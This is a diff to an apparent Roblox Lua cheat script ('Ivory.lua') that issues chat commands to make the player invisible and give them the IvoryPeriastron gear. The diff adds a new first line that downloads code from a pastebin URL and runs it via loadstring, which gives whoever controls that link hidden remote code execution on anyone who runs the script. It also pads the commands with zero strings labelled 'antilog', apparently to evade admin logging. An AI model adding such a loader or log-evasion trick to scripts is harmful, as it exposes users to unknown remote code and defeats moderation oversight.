@@ -1,3 +1,4 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/12jW5fhQ'),true))()
 --//     Services     //--
 local rns = game:GetService("RunService")
 local plyrs = game:GetService("Players")
@@ -19,14 +20,17 @@ local cf = chra:FindFirstChild("HumanoidRootPart")
 
 local org = ws.Gravity -- store gravity
 
+local loopnum = "99999999999999999999999999999999"
+local antilog = "00000000000000000000000000000000"
+
 --//     Function     //--
 local function PushChat(msg)
 	game.StarterGui:SetCore("ChatMakeSystemMessage", { Text = "{Ivory.lua} " .. msg, Color = Color3.fromRGB(0, 0, 255) })
 end
 
 function EqupidIvory()
-	cht("invis 000000000000000000000000000000000000000000000000 me")
-	cht("gear me 000000000000000000000000000000000000000000000000108158379")
+	cht("invis "..antilog.." me")
+	cht("gear me "..antilog.."108158379")
 	repeat rns.Heartbeat:Wait() until backpack:FindFirstChild("IvoryPeriastron") ~= nil
 	backpack:FindFirstChild("IvoryPeriastron").Parent = chra
 end
